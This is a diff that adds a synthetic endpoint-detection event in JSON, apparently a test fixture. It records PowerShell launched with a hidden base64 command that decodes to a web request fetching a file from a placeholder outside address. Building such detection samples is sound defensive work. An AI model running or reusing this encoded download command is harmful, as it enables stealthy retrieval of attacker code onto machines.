@@ -1,0 +1,44 @@
+{
+  "category_uid": 1,
+  "class_uid": 1007,
+  "activity_id": 1,
+  "type_uid": 100701,
+  "schema_version": "1.3.0",
+  "event_id": "evt-0001",
+  "event_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+  "timestamp_utc": "2026-10-03T14:32:01.004000Z",
+  "sensor_source": "endpoint_edr",
+  "host": {
+    "hostname": "WKS-09",
+    "ip_addresses": [
+      "10.0.4.155"
+    ],
+    "os": "Windows 11 Enterprise"
+  },
+  "principal": {
+    "username": "jdoe",
+    "domain": "CORP",
+    "is_elevated": false
+  },
+  "process": {
+    "pid": 4812,
+    "name": "powershell.exe",
+    "file": {
+      "executable_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "hash_sha256": "35a9f24300a84e2dd7bb8e376a91ad3ae4c8d5d4d38c64bb93902fb9600f13a0"
+    },
+    "command_line": "powershell.exe -nop -e aQB3AHIAIAAxADkAOAAuADUAMQAuADEAMAAwAC4ANAAyAC8AdQA=",
+    "parent_pid": 1044,
+    "parent_name": "cmd.exe"
+  },
+  "network": {
+    "destination_ip": "198.51.100.42",
+    "destination_port": 443,
+    "protocol": "TCP"
+  },
+  "untrusted_fields": [
+    "process.command_line",
+    "principal.username",
+    "host.hostname"
+  ]
+}
